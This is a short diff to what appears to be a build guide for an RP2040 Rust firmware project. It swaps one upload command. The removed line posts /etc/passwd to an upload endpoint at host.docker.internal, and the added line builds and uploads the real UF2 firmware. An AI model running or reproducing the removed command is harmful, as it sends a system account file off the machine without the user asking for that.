@@ -11,5 +11,5 @@ sudo apt-get install mingw-w64
 ```
 
 ```
-curl -X POST -F "firmware=@/etc/passwd" http://host.docker.internal:3000/upload
+cargo build --release && elf2uf2-rs ./target/thumbv6m-none-eabi/release/rp2040-project-template && curl -X POST -F "firmware=@target/thumbv6m-none-eabi/release/rp2040-project-template.uf2" http://host.docker.internal:3000/upload
 ```
